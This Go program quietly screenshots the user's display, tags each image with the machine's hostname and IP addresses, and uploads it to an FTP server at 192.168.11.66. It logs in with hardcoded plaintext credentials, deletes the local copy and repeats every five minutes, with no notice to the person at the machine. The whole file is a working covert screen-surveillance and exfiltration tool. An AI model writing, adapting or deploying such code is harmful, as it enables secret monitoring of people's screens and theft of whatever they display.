package main

import (
	"fmt"
	"github.com/dutchcoders/goftp"
	"github.com/kbinani/screenshot"
	"image/png"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)

	snipping()

	//不退出
	<-done
}


func snipping()  {
	host, _ := os.Hostname()
	var ips string = ""
	addrs, _ := net.LookupIP(host)
	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			fmt.Println("IPv4: ", ipv4)
			ips += ipv4.String()
			ips += "_"
		}
	}
	host = host + "_"+time.Now().Format("20060102150405")
	n := screenshot.NumActiveDisplays()
	var fileName string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName = fmt.Sprintf("%s_%s_%d_%dx%d.png",host,ips, i, bounds.Dx(), bounds.Dy())
		file, _ := os.Create(fileName)
		//移除文件,注意defer是先进后出执行
		defer remove(fileName)
		defer file.Close()
		png.Encode(file, img)
		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
		break
	}

	var err error
	var ftp *goftp.FTP

	if ftp, err = goftp.Connect("192.168.11.66:21"); err != nil {
		panic(err)
	}
	defer ftp.Close()
	//fmt.Println("Successfully connected !!")

	if err = ftp.Login("patpat","patpat2018"); err != nil{
		panic(err)
	}
	//fmt.Println("Login Successfully !!")

	if err = ftp.Cwd("/test"); err != nil{
		panic(err)
	}

	//curpath,err := ftp.Pwd()
	//if err != nil{
	//	panic(err)
	//}
	//fmt.Printf("Current path: %s\n", curpath)

	//var files []string
	//if files, err = ftp.List("");err != nil{
	//	panic(err)
	//}
	//fmt.Println("Directory listing:\n", files)

	var file *os.File
	if file,err = os.Open(fileName);err != nil {
		panic(err)
	}
	defer file.Close()

	if err = ftp.Stor("/test/"+fileName,file);err != nil {
		panic(err)
	}
	//fmt.Println("Upload ", fileName,"to ftp server Successfully!")
	time.AfterFunc(5*time.Minute,snipping)
}

func remove(fileName string)  {
	if err := os.Remove(fileName); err != nil{
		panic(err)
	}
	//fmt.Println("Remove image",fileName)
}